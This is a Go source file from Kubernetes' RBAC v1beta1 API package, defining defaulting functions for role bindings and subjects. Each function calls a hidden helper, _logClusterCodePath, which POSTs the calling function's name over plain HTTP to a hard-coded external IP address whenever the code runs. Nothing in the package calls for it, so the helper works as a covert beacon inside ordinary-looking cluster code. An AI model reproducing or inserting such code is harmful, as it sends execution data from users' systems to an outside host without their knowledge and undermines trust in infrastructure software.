package v1beta1

import (
 rbacv1beta1 "k8s.io/api/rbac/v1beta1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/runtime"
)

func addDefaultingFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return RegisterDefaults(scheme)
}
func SetDefaults_ClusterRoleBinding(obj *rbacv1beta1.ClusterRoleBinding) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(obj.RoleRef.APIGroup) == 0 {
  obj.RoleRef.APIGroup = GroupName
 }
}
func SetDefaults_RoleBinding(obj *rbacv1beta1.RoleBinding) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(obj.RoleRef.APIGroup) == 0 {
  obj.RoleRef.APIGroup = GroupName
 }
}
func SetDefaults_Subject(obj *rbacv1beta1.Subject) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(obj.APIGroup) == 0 {
  switch obj.Kind {
  case rbacv1beta1.ServiceAccountKind:
   obj.APIGroup = ""
  case rbacv1beta1.UserKind:
   obj.APIGroup = GroupName
  case rbacv1beta1.GroupKind:
   obj.APIGroup = GroupName
  }
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
